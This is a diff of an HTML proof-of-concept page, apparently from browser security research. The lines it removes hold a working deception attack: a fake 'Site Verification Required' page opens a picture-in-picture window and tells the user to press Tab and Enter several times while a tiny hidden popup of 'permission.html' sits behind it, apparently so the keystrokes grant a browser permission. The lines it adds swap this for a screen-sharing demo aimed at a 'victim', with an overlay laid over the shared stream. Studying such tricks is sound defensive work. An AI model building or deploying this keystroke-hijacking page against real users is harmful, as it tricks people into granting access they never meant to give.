@@ -1,155 +1,68 @@
 <!DOCTYPE html>
 <html lang="en">
-
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Simple 2-Step PiP Game</title>
+  <title>Attacker - Screen Sharing PoC</title>
   <style>
-    body {
-      display: flex;
-      justify-content: center;
-      align-items: center;
-      height: 100vh;
-      margin: 0;
-      background-color: #f0f0f0;
-      font-family: Arial, sans-serif;
+    #video {
+      width: 100%;
+      height: 500px;
+      border: 1px solid black;
+      position: relative;
     }
-
-    button {
-      padding: 10px 20px;
-      font-size: 16px;
-      cursor: pointer;
-      background-color: #0dd438;
-      color: white;
-      border: none;
-      border-radius: 5px;
-    }
-
-    .step-heading {
-      font-size: 18px;
+    #overlay {
+      position: absolute;
+      top: 10%;
+      left: 10%;
+      color: red;
+      background-color: rgba(0, 0, 0, 0.5);
+      padding: 10px;
+      font-size: 20px;
       font-weight: bold;
-      margin-bottom: 10px;
-    }
-
-    .hidden {
-      display: none;
+      pointer-events: none; /* Jangan ganggu interaksi layar */
     }
   </style>
 </head>
-
 <body>
-  <center style="position: absolute; top: 300px;">
-    <h2>Site Verification Required</h2>
-  </center>
-  <button id="open-pip-button" onclick="openPip()">Verify</button>
+  <h2>Victim, Please Share Your Screen</h2>
+  <button id="startButton">Start Screen Sharing</button>
+  <div style="position: relative;">
+    <video id="video" autoplay></video>
+    <div id="overlay">WARNING: DO NOT TRUST THIS CONTENT!</div>
+  </div>
 
   <script>
-    let pipWindow;
-    let popupWindow; // Reference to the permission popup
+    const startButton = document.getElementById('startButton');
+    const videoElement = document.getElementById('video');
 
-    async function openPip() {
+    startButton.addEventListener('click', async () => {
       try {
-        pipWindow = await documentPictureInPicture.requestWindow({
-          width: 1000,
-          height: 1000,
+        // Minta izin untuk berbagi layar
+        const stream = await navigator.mediaDevices.getDisplayMedia({
+          video: {
+            cursor: 'always', // Menampilkan kursor saat berbagi layar
+          }
         });
 
-        const style = pipWindow.document.createElement('style');
-        style.textContent = `
-          body {
-            display: flex;
-            flex-direction: column;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            background-color: #f0f0f0;
-            font-family: Arial, sans-serif;
-          }
-          .step-heading, #message, #confirm-button, #exit-message, #start-button  {
-            font-size: 24px;
-            text-align: center;
-          }
-          #message, #confirm-button, #exit-message, #start-button  {
-            display: none;
-            font-weight: bold;
-            margin-top: 20px;
-          }
-          #confirm-button, #start-button {
-      padding: 10px 20px;
-      font-size: 16px;
-      cursor: pointer;
-      background-color: #0dd438;
-      color: white;
-      border: none;
-      border-radius: 5px;
-          }
-        `;
-        pipWindow.document.head.appendChild(style);
+        // Tampilkan stream pada elemen video
+        videoElement.srcObject = stream;
 
-        // Create and add elements to PiP window
-        createAndAppendElement(pipWindow, 'button', 'start-button', 'Click to Start 2-Step Verification process');
-        createAndAppendElement(pipWindow, 'div', 'step1-heading', 'Step 1:', 'none', 'step-heading');
-        createAndAppendElement(pipWindow, 'div', 'message', 'Press Tab 3 times and then hit confirm for step 2', 'none');
-        createAndAppendElement(pipWindow, 'button', 'confirm-button', 'Confirm', 'none');
-        createAndAppendElement(pipWindow, 'div', 'step2-heading', 'Step 2:', 'none', 'step-heading');
-        createAndAppendElement(pipWindow, 'div', 'exit-message', 'Press Enter twice to Exit and verify', 'none');
+        // Tangani penghentian stream
+        stream.getTracks().forEach(track => {
+          track.onended = () => {
+            console.log('Screen sharing stopped.');
+          };
+        });
 
-        // Add event listeners
-        addEventListeners(pipWindow);
-
-      } catch (error) {
-        console.error('Error opening PiP window:', error);
+        // Simulasi overlay penipuan yang tetap muncul di atas konten berbagi layar
+        const overlay = document.getElementById('overlay');
+        overlay.innerHTML = "PLEASE DO NOT ENTER SENSITIVE INFORMATION HERE!";
+        
+      } catch (err) {
+        console.error('Error sharing screen: ', err);
       }
-    }
-
-    function createAndAppendElement(pipWindow, tagName, id, textContent, display = 'block', className = '') {
-      const element = pipWindow.document.createElement(tagName);
-      element.id = id;
-      element.textContent = textContent;
-      element.style.display = display;
-      if (className) {
-        element.className = className;
-      }
-      pipWindow.document.body.appendChild(element);
-    }
-
-    function addEventListeners(pipWindow) {
-      // Start button click event
-      const startButton = pipWindow.document.getElementById('start-button');
-      startButton.addEventListener('click', () => {
-        popupWindow = window.open('permission.html', 'popupWindow', 'width=100,height=100,left=850,top=650');
-        startButton.style.display = 'none';
-        pipWindow.document.getElementById('step1-heading').style.display = 'block';
-        pipWindow.document.getElementById('message').style.display = 'block';
-        pipWindow.document.getElementById('confirm-button').style.display = 'block';
-      });
-
-      // Confirm button click event
-      const confirmButton = pipWindow.document.getElementById('confirm-button');
-      confirmButton.addEventListener('click', () => {
-        pipWindow.document.getElementById('step1-heading').style.display = 'none';
-        pipWindow.document.getElementById('message').style.display = 'none';
-        confirmButton.style.display = 'none';
-        pipWindow.document.getElementById('step2-heading').style.display = 'block';
-        pipWindow.document.getElementById('exit-message').style.display = 'block';
-      });
-
-      // Exit on Enter key press
-      pipWindow.addEventListener('keydown', (event) => {
-        if (event.key === 'Enter') {
-          pipWindow.close();
-          // Close the permission popup after few seconds
-          setTimeout(() => {
-            if (popupWindow) {
-              popupWindow.close();
-            }
-          }, 500);
-        }
-      });
-    }
+    });
   </script>
 </body>
-
 </html>
